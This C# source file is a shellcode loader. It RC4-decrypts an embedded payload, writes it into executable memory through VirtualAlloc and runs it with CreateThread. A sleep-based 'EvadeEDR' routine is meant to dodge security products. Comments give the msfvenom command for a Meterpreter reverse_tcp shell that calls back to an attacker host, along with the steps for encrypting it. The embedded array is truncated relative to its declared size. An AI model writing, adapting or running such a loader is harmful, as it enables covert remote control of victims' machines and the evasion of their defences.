using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Timers;
using System.Buffers.Text;
using System.Collections;
using System.Text.RegularExpressions;

public class RC4
{
    public static string Encrypt(string key, string data)
    {
        Encoding unicode = Encoding.Unicode;

        return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
    }

    public static string Decrypt(string key, string data)
    {
        Encoding unicode = Encoding.Unicode;

        return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
    }

    public static byte[] Encrypt(byte[] key, byte[] data)
    {
        return EncryptOutput(key, data).ToArray();
    }

    public static byte[] Decrypt(byte[] key, byte[] data)
    {
        return EncryptOutput(key, data).ToArray();
    }

    private static byte[] EncryptInitalize(byte[] key)
    {
        byte[] s = Enumerable.Range(0, 256)
          .Select(i => (byte)i)
          .ToArray();

        for (int i = 0, j = 0; i < 256; i++)
        {
            j = (j + key[i % key.Length] + s[i]) & 255;

            Swap(s, i, j);
        }

        return s;
    }

    private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
    {
        byte[] s = EncryptInitalize(key);

        int i = 0;
        int j = 0;

        return data.Select((b) =>
        {
            i = (i + 1) & 255;
            j = (j + s[i]) & 255;

            Swap(s, i, j);

            return (byte)(b ^ s[(s[i] + s[j]) & 255]);
        });
    }

    private static void Swap(byte[] s, int i, int j)
    {
        byte c = s[i];

        s[i] = s[j];
        s[j] = c;
    }

}
class Program
{
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
          uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void EvadeEDR()
        {
         
            DateTime startTime = DateTime.Now;
            Sleep(10000);
            double stopTime = DateTime.Now.Subtract(startTime).TotalSeconds;

            if (stopTime < 4.5)
            {
                return;
            }
       

        }

        static void Main(string[] args)
        {

           EvadeEDR();

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(hostname -I | cut -d' ' -f1) LPORT=9001 EXITFUNC=thread -f csharp -o mrtcp_csharp.txt
            // python3 rc4.py -k 'HLkkMYkLyJt]k=JWa-4frG4m^$;tx?' -f mrtcp_csharp.txt -o mrtcp_rc4.txt
            // xxd -i mrtcp_rc4.txt

            // replace this
            byte[] enc_buf = new byte[2628] {
                                            0xc2, 0x14, 0xd6, 0x08, 0x01, 0x44, 0xd6, 0x22, 0xa2, 0x53, 0xad, 0x91,
                                            0x84, 0x26, 0x86, 0xae, 0x61, 0x4e, 0xc7, 0xf1, 0x2e, 0x70, 0x8c, 0x34
                                            };                          


        string key = "HLkkMYkLyJt]k=JWa-4frG4m^$;tx?";

        byte[] keyByte = Encoding.ASCII.GetBytes(key);
        byte[] decrypt = RC4.Decrypt(keyByte, enc_buf);

        Console.WriteLine("Decrypted Text: " + System.Text.Encoding.UTF8.GetString(decrypt));
        Console.WriteLine("Length: " + decrypt.Length);

        string input = System.Text.Encoding.UTF8.GetString(decrypt);

        // Parse the string to extract the byte array
        byte[] buf = ParseByteArray(input);

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    static byte[] ParseByteArray(string input)
    {
        // Find the start and end of the byte array initialization
        int startIndex = input.IndexOf('{') + 1;
        int endIndex = input.IndexOf('}');

        // Extract the substring containing the hex values
        string hexValues = input.Substring(startIndex, endIndex - startIndex);

        // Split the hex values into an array of strings
        string[] hexArray = hexValues.Split(new[] { ',', ' ', '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

        // Convert the hex strings to byte values
        byte[] byteArray = hexArray.Select(hex => Convert.ToByte(hex, 16)).ToArray();

        return byteArray;
    }
}
